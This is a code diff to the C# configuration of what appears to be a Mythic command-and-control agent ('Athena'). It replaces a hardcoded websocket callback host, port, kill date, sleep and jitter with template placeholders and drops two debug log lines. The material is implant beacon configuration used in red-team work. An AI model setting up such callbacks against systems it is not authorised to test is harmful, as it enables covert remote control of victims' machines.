@@ -20,12 +20,12 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "b3b72cb5-8e39-498f-9b27-525d05ac394e";
-            DateTime kd = DateTime.TryParse("2024-10-10", out kd) ? kd : DateTime.MaxValue;
+            this.uuid = "%UUID%";
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.smbConfig = new SmbServer();
@@ -49,14 +49,14 @@ namespace Athena.Config
 
         public Websocket(string uuid)
         {
-            int callbackPort = Int32.Parse("8081");
-            string callbackHost = "ws://10.10.50.43";
-            this.endpoint = "socket";
+            int callbackPort = Int32.Parse("callback_port");
+            string callbackHost = "callback_host";
+            this.endpoint = "ENDPOINT_REPLACE";
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "";
-            this.encryptedExchangeCheck = bool.Parse("false");
+            this.psk = "AESPSK";
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
@@ -73,11 +73,10 @@ namespace Athena.Config
             {
                 ws = new ClientWebSocket();
                 ws.ConnectAsync(new Uri(url), CancellationToken.None);
-                Misc.WriteDebug("Connecting to: " + url);
                 while (ws.State != WebSocketState.Open)
                 {
                 }
-                Misc.WriteDebug("Connected.");
+
                 return true;
             }
             catch
